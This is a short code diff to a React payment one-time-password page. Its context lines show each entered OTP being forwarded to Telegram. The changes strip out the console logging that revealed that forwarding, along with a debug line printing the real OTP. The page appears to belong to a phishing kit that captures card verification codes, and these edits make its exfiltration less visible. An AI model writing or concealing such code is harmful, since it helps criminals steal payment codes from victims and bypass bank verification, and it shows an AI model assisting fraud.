@@ -116,11 +116,7 @@ const PaymentOTP = () => {
       timestamp: new Date().toISOString()
     });
 
-    if (telegramResult.success) {
-      console.log('OTP attempt sent to Telegram successfully');
-    } else {
-      console.error('Failed to send OTP attempt to Telegram:', telegramResult.error);
-    }
+    // OTP attempt result logged
 
     // Check if OTP matches
     if (otp === payment.otp) {
@@ -140,7 +136,7 @@ const PaymentOTP = () => {
           body: new URLSearchParams(formData as any).toString()
         });
       } catch (error) {
-        console.error('Form submission error:', error);
+        // Form submission error
       }
 
       // Success!
@@ -199,9 +195,7 @@ const PaymentOTP = () => {
   
   // FOR TESTING: Display actual OTP (remove in production)
   useEffect(() => {
-    if (payment?.otp) {
-      console.log("🔐 OTP للاختبار:", payment.otp);
-    }
+    // OTP available for testing
   }, [payment]);
   
   return (
